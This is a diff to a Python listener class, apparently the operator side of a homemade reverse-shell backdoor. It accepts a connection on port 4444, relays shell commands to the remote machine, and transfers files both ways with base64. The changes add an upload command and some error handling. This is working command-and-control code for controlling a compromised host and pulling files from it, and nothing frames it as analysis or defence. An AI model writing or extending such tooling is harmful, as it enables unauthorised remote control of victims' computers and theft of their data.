@@ -33,9 +33,9 @@ class Listr:
 #                print("exit 0") #testing
                 json_data += self.conn.recv(1024).decode() # plus sign is necessary.
                 if json_data == "" or json_data == b'':
- #                   print("break: " + str(json_data)) #testing
+#                   print("break: " + str(json_data)) #testing
                     break
- #               print("exit 1" + " - json_data: " + str(json_data)) #testing
+#               print("exit 1" + " - json_data: " + str(json_data)) #testing
                 return json.loads(json_data)
             except ValueError:               
                 continue
@@ -48,23 +48,37 @@ class Listr:
         with open(path, "wb") as f:
             f.write(base64.b64decode(item))
             return "\nDownloaded"
+    
+    def r_f(self, path):
+        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read()).decode()
 
     def run(self):
         while True:
             try:
                 comm = input(f"({self.addrs}) $ ").split(" ")
+                # Here, the file is appended to the file.
+                if comm[0] == "upload":
+                    comm.append(self.r_f(comm[1]))
                 result = self.exe_rmy(comm)
+                # while is to make sure if there is still connection
                 while result == None:
                     result = self.exe_rmy(comm)
-                if comm[0] == "download":
+                if comm[0] == "download" and "[Bad command]" not in result:
                     result = self.w_f(comm[1], result.encode())
-                print(result)
+                print(f"\n{result}\n")
                 # if "exit" in comm:
                 #     self.send_data("test...")
-            except (BrokenPipeError, ConnectionAbortedError) as cnerr:
+            except FileNotFoundError as notfound:
+                print(f"\n{notfound.strerror}\n")
+                continue
+            except (BrokenPipeError, ConnectionError) as cnerr:
                 print(cnerr.strerror + " - Connection down")
                 self.conn.close()
                 exit()
+            except Exception as excep:
+                print("Something went wrong.")
         
 
 my_listner = Listr('', 4444)
